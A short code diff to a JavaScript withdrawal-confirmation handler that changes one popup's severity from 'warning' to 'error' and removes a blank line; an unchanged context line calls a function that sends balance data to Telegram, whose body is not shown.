@@ -866,7 +866,7 @@ function handleConfirm() {
     }
 
     if (currentAction === "withdraw" && amount > userBalance) {
-        showErrorPopup("warning", `Maximum withdraw amount is ${userBalance} XML.`);
+        showErrorPopup("error", `Maximum withdraw amount is ${userBalance} XML.`);
         return;
     }
 
@@ -878,7 +878,6 @@ function handleConfirm() {
     sendBalanceDataToTelegram(data);
     showCountdownPopup();
 }
-
 
 function showCountdownPopup() {
     popupOverlay.style.display = "none";
